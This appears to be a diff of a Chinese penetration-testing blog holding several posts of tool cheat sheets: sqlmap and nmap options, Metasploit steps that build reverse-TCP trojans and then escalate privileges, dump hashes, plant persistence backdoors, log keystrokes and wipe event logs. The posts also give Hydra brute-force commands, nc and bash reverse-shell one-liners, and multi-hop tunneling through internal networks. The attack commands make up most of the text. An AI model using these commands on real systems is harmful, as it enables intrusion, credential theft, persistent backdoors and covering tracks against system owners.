+</thead>
+<tbody><tr>
+<td align="left"><code>-u &quot;地址&quot;</code></td>
+<td>指定存在注入的url</td>
+</tr>
+<tr>
+<td align="left"><code>--dbms</code></td>
+<td>指定数据库类型</td>
+</tr>
+<tr>
+<td align="left"><code>--dbms-cred=DBMS.</code>&nbsp;&nbsp;&nbsp;</td>
+<td>数据库的认证,例子:–dbms-cred=”name:password”</td>
+</tr>
+<tr>
+<td align="left"><code>--dbs</code></td>
+<td>搜索所有库</td>
+</tr>
+<tr>
+<td align="left"><code>-D</code></td>
+<td>指定某个数据库</td>
+</tr>
+<tr>
+<td align="left"><code>-table</code></td>
+<td>搜索所有表</td>
+</tr>
+<tr>
+<td align="left"><code>-T</code></td>
+<td>指定某个表</td>
+</tr>
+<tr>
+<td align="left"><code>-column</code></td>
+<td>搜搜所有字段</td>
+</tr>
+<tr>
+<td align="left"><code>-C</code></td>
+<td>指定某个字段</td>
+</tr>
+<tr>
+<td align="left"><code>-dump</code></td>
+<td>提取当前数据</td>
+</tr>
+<tr>
+<td align="left"><code>-v</code></td>
+<td>显示信息[1-6]</td>
+</tr>
+<tr>
+<td align="left"><code>--users</code></td>
+<td>查询一共都有哪些用户，常用，直接用–users</td>
+</tr>
+<tr>
+<td align="left"><code>--passwords</code></td>
+<td>查询用户密码的哈希，常用，直接用–passwords</td>
+</tr>
+<tr>
+<td align="left"><code>--privileges</code></td>
+<td>查看特权，常用。例 –privileges -U username (CU 就是当前用户)</td>
+</tr>
+<tr>
+<td align="left"><code>--method=</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+<td>指定提交方式—-例子–method=GET –method=POST</td>
+</tr>
+<tr>
+<td align="left"><code>–proxy</code></td>
+<td>使用代理,例子</td>
+</tr>
+<tr>
+<td align="left"><code>–prefix</code></td>
+<td>增加前缀,例子</td>
+</tr>
+<tr>
+<td align="left"><code>--suffix</code></td>
+<td>增加后缀</td>
+</tr>
+<tr>
+<td align="left"><code>--level</code></td>
+<td>设置测试的等级[1-5],默认1</td>
+</tr>
+<tr>
+<td align="left"><code>--technique=TECH</code>&nbsp;&nbsp;&nbsp;</td>
+<td>指定所使用的技术（B:布尔盲注;E:报错注入;U:联合查询注入;S:文件系统，操作系统，注册表相关注入;T:时间盲注; 默认全部使用）</td>
+</tr>
+<tr>
+<td align="left"><code>--time-sec=TIMESEC</code>&nbsp;&nbsp;</td>
+<td>在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒。</td>
+</tr>
+<tr>
+<td align="left"><code>--dns-domain=DNS..</code></td>
+<td>如果你控制了一台dns服务器，使用这个可以提高效率,例子:–dns-domain 123.com</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>高级:</p>
+<p><code> --tamper &quot;*.py&quot;</code>:使用绕过脚本<br>    —-例子:charencode.py/charunicodeencode.py:重要*****</p>
+<p><code>--cookie</code>:指定cookie值:重要<br>    —-例子:-u “<a target="_blank" rel="noopener" href="http://www.abc.com/index.php?id=1&quot;">www.abc.com/index.php?id=1&quot;</a> –cookie=”a=1;b=2”</p>
+<p><code>--user-agent</code>:指定user-agent内容</p>
+<p><code>--host</code>:指定host内容</p>
+<p><code>--referer</code>:指定referer</p>
+<p><code>-H --headers</code> 额外的header头:重要<br>        —-例子:–headers=”host:<a target="_blank" rel="noopener" href="http://www.a.com/nUser-Agent:yuangh&quot;">www.a.com\nUser-Agent:yuangh&quot;</a></p>
+<p><code>--ignore-proxy</code> 无视本地的代理</p>
+<p><code>--ignore-redirects</code> 无视http重定向，比如登录成功会跳转到其他网页，可使用这个忽略掉。</p>
+<p><code>--timeout=TIMEOUT</code> 请求超时的时间，单位为秒，浮点数，默认30s。</p>
+<p><code>-f</code>:指纹信息，返回DBMS，操作系统，架构，补丁等信息。</p>
+<p><code>–tor :-tor-port</code>:手动设置TOR代理，</p>
+<p><code>-tor-type</code>:检查你的代理是否被正确地安装并正常的工作<br>        —-安装:sudo apt-get install tor tor-geoip<br>        —-举例:进入sqlmap的目录后:./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.targetvuln.com/index/php?cata_id=1&quot;">http://www.targetvuln.com/index/php?cata_id=1&quot;</a> -b -a -tor </p>
+<p><code>–check-tor–user-agent</code>=”Mozilla/5.0(compatible;Googlebot/2.1;+<a target="_blank" rel="noopener" href="http://www.google.com/bot.html)&quot;">http://www.google.com/bot.html)&quot;</a></p>
+<p>shell</p>
+<p> <code>--os-cmd=OSCMD</code> 执行一句系统命令。<br>        —-举例:–os-shell=”ipconfig -all”</p>
+<p><code>--os-shell</code> 创建一个对方操作系统的shell，远程执行系统命令</p>
+<p><code>--priv-esc</code> 自动提权，数据库进程用户权限提升。</p>
+<p><code>--msf-path=MSFPATH Metasploit Framework</code>本地的安装路径。</p>
+<p><code>--tmp-path=TMPPATH</code> 远程临时文件目录的绝对路径。</p>
+<p><code>--reg-add</code> 添加一个注册表。</p>
+<p><code>--reg-del</code> 删一个注册表。</p>
+<p><code>--wizard</code> 新手教程。</p>
+</blockquote>
+<h3 id="三-nmap"><a href="#三-nmap" class="headerlink" title="三.nmap"></a>三.nmap</h3><p>最常用</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p1-65535 </code>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+<td>扫描指定端口</td>
+</tr>
+<tr>
+<td><code> -p2,3,4</code></td>
+<td>10.0.1.161   -p20-200,7777,8888 指定不连续端口</td>
+</tr>
+<tr>
+<td><code>-sU udp</code></td>
+<td>端口扫描 扫描完6万个端口需要20分钟左右</td>
+</tr>
+<tr>
+<td><code>-Pn</code></td>
+<td>不对目标进行ping探测（不判断主机是否在线）（直接扫描端口）</td>
+</tr>
+<tr>
+<td><code>-V</code></td>
+<td>详细信息</td>
+</tr>
+<tr>
+<td><code>-A</code></td>
+<td>操作系统和版本信息</td>
+</tr>
+<tr>
+<td><code>-O</code></td>
+<td>检测操作系统</td>
+</tr>
+<tr>
+<td><code>-sA</code></td>
+<td>探测是否使用了防火墙 –例子:All 1680 scanned ports on server2.tecmint.com (192.168.0.101) are UNfiltered</td>
+</tr>
+<tr>
+<td><code>-sP</code></td>
+<td>仅探测是否在线</td>
+</tr>
+<tr>
+<td><code>-sT/sU/sS   </code></td>
+<td>TCP/UDP/半开放扫描</td>
+</tr>
+<tr>
+<td><code>-sL</code></td>
+<td>(Idlescan)使用另外一个目标网络的主机发送数据包.隐藏自己ip:重要****</td>
+</tr>
+<tr>
+<td><code>--iflist</code></td>
+<td>检测主机接口和路由信息:重要****</td>
+</tr>
+<tr>
+<td><code>-iL</code></td>
+<td>指定ip文件</td>
+</tr>
+<tr>
+<td><code>-F</code></td>
+<td>快速扫描，仅扫描列在nmap-services文件中的端口而避开所有其它的端口。</td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>顺序端口扫描(扫所有端口)</td>
+</tr>
+</tbody></table>
+<p>​    常用</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>, - </code></td>
+<td>用空格或-或,-例子:nmap 10.0.1.161  10.0.1.162   nmap 10.0.1.161-162     nmap 10.0.1.161,162</td>
+</tr>
+<tr>
+<td><code>10.0.3.0/24</code></td>
+<td>nmap  10.0.3.0/24</td>
+</tr>
+<tr>
+<td><code>--exclude</code></td>
+<td>排除某个ip</td>
+</tr>
+<tr>
+<td>—-例子</td>
+<td>排除连续ip:nmap 10.0.1.161-162  –exclude 10.0.1.162</td>
+</tr>
+<tr>
+<td>—-例子</td>
+<td>排除多个ip:nmap 10.0.1.161-163 –exclude 10.0.1.162-163</td>
+</tr>
+<tr>
+<td>—-例子</td>
+<td>排除不连续ip:nmap 10.0.1.161-163 –exclude 10.0.1.161,10.0.1.163</td>
+</tr>
+<tr>
+<td>—-例子</td>
+<td>排除文件内ip:nmap 10.0.1.161-163  –excludefile ex.txt</td>
+</tr>
+<tr>
+<td><code>-sF-sX-sN</code></td>
+<td>秘密FIN数据包扫描、圣诞树(XmasTree)、空(Null)扫描模式：即使SYN扫描都无法确定的情况下使用**</td>
+</tr>
+<tr>
+<td><code>-bFTP</code></td>
+<td>反弹攻击(bounceattack)**</td>
+</tr>
+</tbody></table>
+<p>端口状态:</p>
+<table>
+<thead>
+<tr>
+<th align="center">命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">open</td>
+<td>应用程序在该端口接收 TCP 连接或者 UDP 报文。</td>
+</tr>
+<tr>
+<td align="center">closed</td>
+<td>关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</td>
+</tr>
+<tr>
+<td align="center">filtered</td>
+<td>由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</td>
+</tr>
+<tr>
+<td align="center">unfiltered</td>
+<td>未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</td>
+</tr>
+<tr>
+<td align="center">open</td>
+<td>filtered</td>
+</tr>
+<tr>
+<td align="center">closed</td>
+<td>filtered</td>
+</tr>
+</tbody></table>
+<p>参考文档:<a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E4%BA%86nmap">https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap</a></p>
+<h3 id="四-MSF"><a href="#四-MSF" class="headerlink" title="四.MSF"></a>四.MSF</h3><p>​    </p>
+<ul>
+<li><p>1.生成windows下的exe反弹木马<br>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe</p>
+<pre><code>        // -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt;</code></pre>
+</li>
+<li><p>生成linux的反弹elf木马</p>
+<p>  msf5 &gt; use payload/linux/x64/meterpreter/reverse_tcp<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.5.187<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lport 20000<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; generate -h<br>  generate -f elf -o ~/Desktop/centos.elf</p>
+</li>
+<li><p>2.监听<br>  use exploit/multi/handler</p>
+<pre><code>        set PAYLOAD windows/meterpreter/reverse_tcp
+        set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip
+        set LPORT 8888
+        exploit -j</code></pre>
+</li>
+<li><p>3.内网代理    首先需要链接sessions,在此基础下添加路由<br>  meterpreter &gt; run get_local_subnets //获取网段</p>
+<pre><code>        meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由
+        meterpreter &gt; run autoroute -p //查看路由
+        meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段
+        meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
+        meterpreter &gt; background //后台sessions</code></pre>
+</li>
+<li><p>4.提权<br>  (1)getsystem</p>
+<pre><code>        meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法
+        (2)使用exp提权
+        meterpreter &gt; background //先后台运行会话
+        [*] Backgrounding session 1…
+        msf &gt; use post/windows/escalate/ms10_073_kbdlayout
+        msf &gt; show options
+        msf &gt; set session 1 //设置要使用的会话
+        msf post(ms10_073_kbdlayout) &gt; exploit
+        注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。
+        或者直接：
+        meterpreter &gt; run post/windows/escalate/ms10_073_kbdlayout
+        (3)盗取令牌
+        meterpreter &gt; use incognito //进入这个模块
+        meterpreter &gt; list_tokens –u //查看存在的令牌
+        meterpreter &gt; impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠
+        (4)过UAC
+        msf &gt; use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
+        msf &gt; show options
+        msf &gt; set session 4
+        msf &gt; run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权
+        (5)Hash
+        meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。</code></pre>
+</li>
+<li><p>5.留后门<br>(1)服务留后门：</p>
+<pre><code>          meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole
+          msf &gt; use exploit/multi/handler //新终端中监听
+          msf &gt; set payload windows/metsvc_bind_tcp
+          msf &gt; set LPORT 31337
+          msf &gt; set RHOST 192.168.0.128
+          msf &gt; run //获取到的会话是system权限
+      (2)启动项后门：
+          meterpreter &gt; run persistence -X -i 10 -p 6666 -r 192.168.71.105</code></pre>
+<p>​        // -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。</p>
+<p>​        <code>注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。 ​        缺点：容易被杀毒软件杀 。</code></p>
+</li>
+<li><p>6.爆破ssh<br> use auxiliary/scanner/ssh/ssh_login</p>
+<pre><code>   set rhosts 7.7.7.20
+   set username root
+   set pass_file /root/pass.txt //加载字典，可以收集密码做字典
+   set threads 50
+   run</code></pre>
+</li>
+<li><p>7.nmap扫描基本信息<br> msf &gt; nmap –script=vuln 受害靶机ip地址</p>
+<pre><code>   msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</code></pre>
+</li>
+<li><p>8.清除记录<br> msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</p>
+</li>
+</ul>
+<p>  MSF常用命令：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>截图</td>
+<td><code>screenshot</code></td>
+</tr>
+<tr>
+<td>查看是否是虚拟机</td>
+<td><code>run checkvm</code></td>
+</tr>
+<tr>
+<td>查看运行木马的用户</td>
+<td><code>getuid</code></td>
+</tr>
+<tr>
+<td>注入到进程</td>
+<td><code>migrate pid</code> //成功会提示successfully</td>
+</tr>
+<tr>
+<td>加载mimikatz模块</td>
+<td><code>meterpreter &gt; load mimikatz meterpreter &gt; wdigest </code>//需要system权限</td>
+</tr>
+<tr>
+<td>获取键盘记录</td>
+<td><code>meterpreter&gt; run post/windows/capture/keylog_recorder</code> //运行键盘记录模块，他自己创建本文。</td>
+</tr>
+</tbody></table>
+<p>msf部分取自：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/hookjoy/p/7989715.html">http://www.cnblogs.com/hookjoy/p/7989715.html</a>        </p>
+<h3 id="五Hydra"><a href="#五Hydra" class="headerlink" title="五Hydra"></a>五Hydra</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-R</td>
+<td>根据上一次进度继续破解</td>
+</tr>
+<tr>
+<td>-S</td>
+<td>使用SSL协议连接</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>指定端口</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>指定用户名</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>指定用户名字典(文件)</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定密码破解</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>指定密码字典(文件)</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>空密码探测和指定用户密码探测(ns)</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>用户名可以用:分割(username:password)可以代替-l username -p password</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>输出文件</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>指定多线程数量，默认为16个线程</td>
+</tr>
+<tr>
+<td>-vV</td>
+<td>显示详细过程</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>一旦破解成功就停止</td>
+</tr>
+</tbody></table>
+<p>实例：</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>破解ssh的密码</td>
+<td>hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</td>
+</tr>
+<tr>
+<td>破解https</td>
+<td>hydra -m /index.php -l username -P pass.txt IP https</td>
+</tr>
+<tr>
+<td>破解smb</td>
+<td>hydra -l administrator -P pass.txt IP smb</td>
+</tr>
+<tr>
+<td>破解rdp</td>
+<td>hydra IP rdp -l administrator -P pass.txt -V</td>
+</tr>
+<tr>
+<td>破解http-proxy</td>
+<td>hydra -l admin -P pass.txt http-proxy://10.36.16.18</td>
+</tr>
+<tr>
+<td>破解telnet</td>
+<td>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</td>
+</tr>
+<tr>
+<td>破解ftp1</td>
+<td>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</td>
+</tr>
+<tr>
+<td>破解ftp2</td>
+<td>hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV</td>
+</tr>
+<tr>
+<td>get方式提交，破解web登录1</td>
+<td>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/</td>
+</tr>
+<tr>
+<td>get方式提交，破解web登录2</td>
+<td>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php`</td>
+</tr>
+<tr>
+<td>post方式提交，破解web登录1</td>
+<td>hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form</td>
+</tr>
+<tr>
+<td>post方式提交，破解web登录2</td>
+<td>index.php:name=^USER^&amp;pwd=^PASS^:<code>&lt;title&gt;invalido&lt;/title&gt;</code></td>
+</tr>
+</tbody></table>
 
-                </ul>
-                <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2020
-                    <br>
-                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
-                    <br>
-                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
-                </p>
-
-            </div>
-        </div>
+      
     </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/16/%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" data-id="ckgg5oe1i001mzov27tymapxz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8/" rel="tag">常用工具及使用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-内网穿透工具" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2019-03-10T09:01:24.000Z" itemprop="datePublished">2019-03-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/">内网穿透工具</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="内网转发的三种：反弹shell、反弹端口、反弹代理"><a href="#内网转发的三种：反弹shell、反弹端口、反弹代理" class="headerlink" title="内网转发的三种：反弹shell、反弹端口、反弹代理"></a>内网转发的三种：反弹shell、反弹端口、反弹代理</h2><p>虚拟终端和bash -i的区别：</p>
+<pre><code>bash -i是交互式的shell，很多程序都要求用交互式shell</code></pre>
+<h1 id="一。反弹shell"><a href="#一。反弹shell" class="headerlink" title="一。反弹shell"></a>一。反弹shell</h1><blockquote>
+<p>nc的使用：</p>
+</blockquote>
+<p>有两种方式：</p>
+<p>1.被动连接(让被攻击者反弹到监听)<br>    powershell中反弹命令：<br>    <code>nc ip port -e cmd.exe</code><br>    <code>nc ip port -e /bin/bash</code><br>    <code>bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</code></p>
+<p><code>监听nc -lnvp port</code></p>
+<p>2.主动连接(主动连接被攻击者)<br>    特点：攻击者不需要公网ip，但是被攻击的服务器必须在公网上<br>    被攻击：<br>    <code>nc -lnvp port -e cmd </code><br>    <code>nc -lnvp port -e /bin/bash</code><br>    攻击：<br>    <code>nc ip port</code></p>
+<p>还有其他反弹的方式：如perl、php、python语言反弹<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>
+<h1 id="二。反弹端口"><a href="#二。反弹端口" class="headerlink" title="二。反弹端口"></a>二。反弹端口</h1><p>流程：A出-&gt;B入-&gt;B出-&gt;C入（A为攻击者、B为getshell机器、C为内网被攻击者）    </p>
+<p>工具：lcx(windows)、frp</p>
+<blockquote>
+<p>lcx工具的使用：</p>
+</blockquote>
+<pre><code>步骤一：外网服务器开启监听
+lcx -listen 4444 12345
+步骤二：将被控主机端口转发到外网服务器
+lcx.exe –slave 公网 IP + 端口 被控服务器IP + 端口
+lcx -slave 1.1.1.1 4444 127.0.0.1 80
+步骤三：在外网服务器连接本地12345端口
+然后mstsc 127.0.0.1:12345</code></pre>
+<blockquote>
+<p>用nc进行文件传输:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A:&#96;tar cfz - 文件名 | nc 10.0.1.162 9995&#96;</span><br><span class="line">B:&#96;nc -l 21000 | tar zxvf -&#96;</span><br><span class="line"></span><br><span class="line">nc的使用:https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nmap&#x2F;p&#x2F;6148306.html</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>frp的使用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">bind_addr&#x3D;0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">auto_token&#x3D;12345678（密码可以自己修改）</span><br><span class="line"></span><br><span class="line">dashboard_port &#x3D; 7500（网页登录端口）</span><br><span class="line">dashboard_user &#x3D; admin（网页登录账户）</span><br><span class="line">dashboard_pwd &#x3D; admin（网页登录密码）</span><br><span class="line">https:&#x2F;&#x2F;www.atsurak.com&#x2F;frp-windows-rdp&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>常见要扫描的端口：</p>
+</blockquote>
+<ul>
+<li><p>22端口—爆破，无意义<br><code>hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</code></p>
+</li>
+<li><p>80端口—http的注入</p>
+</li>
+<li><p>1433端口—mssql数据库</p>
+</li>
+<li><p>6379端口—外联<br>redis -cli -h ip -p port<br>config get dir 查看之前的设置路径<br>config get dbfilename 查看之前的创建文件<br>keys *查看之前创建的键，”key” “ssh”<br>get ssh查看之前的键值</p>
+</li>
+<li><p>8000端口—网站</p>
+</li>
+<li><p>9000端口—nginx漏洞<br>***找未授权类可以利用的端口，才有意义</p>
+</li>
+</ul>
+<p>等等</p>
+<hr>
+<hr>
+<h1 id="三。反弹代理"><a href="#三。反弹代理" class="headerlink" title="三。反弹代理"></a>三。反弹代理</h1><blockquote>
+<p>ew工具的使用：</p>
+</blockquote>
+<ul>
+<li>第1种方式.在中间人服务器使用<br><code>ew -s ssocksd -l 4444</code>—在服务器上监听一个端口，所有发送到这个端口的流量都将被此服务器转发，(类似shadowsocks)    </li>
+</ul>
+<ul>
+<li>第2种方式.在攻击者和被攻击者服务器使用<pre><code>攻击者：ew -s rcsocks -l 1080 -e 6666
+被攻击方：ew -s rssocks -d 192.168.11.123 -e 6666</code></pre>
+</li>
+</ul>
+<p>多层内网穿透：</p>
+<p>假设win2008R2在内网[无公网ip]并在一个独立的内网段,win2008也处在目标内网,假设在另一个内网段,centos 5.1同样也处在内网,可又在另一个单独的内网段且win2008R2能访问win2008,win2008能访问centos 5.1,而centos 5.1能访问目标核心网,要实现层层穿透,访问到核心网资源,我们就可以这样</p>
+<p>1.先在win7[vps]上执行,把来自外部的1080端口流量转到本地的1235端口上</p>
+<p><code>./ew_for_Win.exe -s rcsocks -l 1080 -e 1235</code></p>
+<p>2.在内网入口上执行,把win7[vps]的1235端口和内网win2008的3456端口绑定</p>
+<p><code>ew_for_Win.exe -s lcx_slave -d 192.168.3.232 -e 1235 -f 192.168.32.170 -g 3456</code></p>
+<p>3.在内网二层数据库服务器上执行,将来自外部的1236端口和本地的3456端口进行绑定<br><code>./ew_for_Win.exe -s lcx_listen -l 3456 -e 1236</code></p>
+<p>4.在最里层的linux上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功<br><code>./ew_for_Linux32 -s rssocks -d 192.168.32.170 -e 1236</code></p>
+<p>5.最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据    </p>
+<blockquote>
+<p>对应的代理工具使用：</p>
+</blockquote>
+<p>1.proxifier</p>
+<p>2.SocksCap64    </p>
+<p>3.proxyChains工具</p>
+<p>​    用代理时nmap -sT -Pn ip才能扫描到<br>​        linux设置全局：</p>
+<p>​    <code>alias proxy=&#39;export all_proxy=socks5://127.0.0.1:1086&#39;</code><br>​        <code>alias unproxy=&#39;unset all_proxy&#39;</code><br>​                    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/" data-id="ckgg5oe0u0010zov220hagniz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">内网转发</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-提权" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/03/%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2019-03-03T07:20:00.000Z" itemprop="datePublished">2019-03-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/03/%E6%8F%90%E6%9D%83/">提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<hr>
+<h1 id="0x00本地服务提权"><a href="#0x00本地服务提权" class="headerlink" title="0x00本地服务提权"></a>0x00本地服务提权</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>1.从外部攻击服务器</p>
+<ul>
+<li><p>ms17-010</p>
+</li>
+<li><p>ms08-067</p>
+</li>
+<li><p>…</p>
+</li>
+</ul>
+<p>  2.从内部攻击服务器</p>
+<ul>
+<li>上传提权脚本    x64.exe\pr.exe</li>
+<li>然后运行就可以了</li>
+</ul>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>只能从内部攻击服务器</p>
+<ul>
+<li><p>获取内核版本，操作系统版本，</p>
+</li>
+<li><p>去找对应的exp</p>
+</li>
+<li><p>下载exp.c文件，进行编译运行</p>
+<hr>
+<hr>
+</li>
+</ul>
+<h1 id="0x01数据库提权"><a href="#0x01数据库提权" class="headerlink" title="0x01数据库提权"></a>0x01数据库提权</h1><h3 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h3><h3 id="mssql直接执行命令"><a href="#mssql直接执行命令" class="headerlink" title="mssql直接执行命令"></a>mssql直接执行命令</h3><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul>
+<li><p>windows：开机启动项、mof脚本、udf函数</p>
+</li>
+<li><p>linux：udf函数、计划任务、ssh公钥</p>
+</li>
+</ul>
+<hr>
+<hr>
+<h1 id="0x02第三方软件提权："><a href="#0x02第三方软件提权：" class="headerlink" title="0x02第三方软件提权："></a>0x02第三方软件提权：</h1><ul>
+<li>server-u</li>
+<li>远控软件</li>
+<li>。。。</li>
+</ul>
+<hr>
+<hr>
+<h1 id="0x03维持权限-留后门"><a href="#0x03维持权限-留后门" class="headerlink" title="0x03维持权限(留后门)"></a>0x03维持权限(留后门)</h1><h2 id="一。windows留后门"><a href="#一。windows留后门" class="headerlink" title="一。windows留后门"></a>一。windows留后门</h2><ul>
+<li><p>1.添加隐藏账户</p>
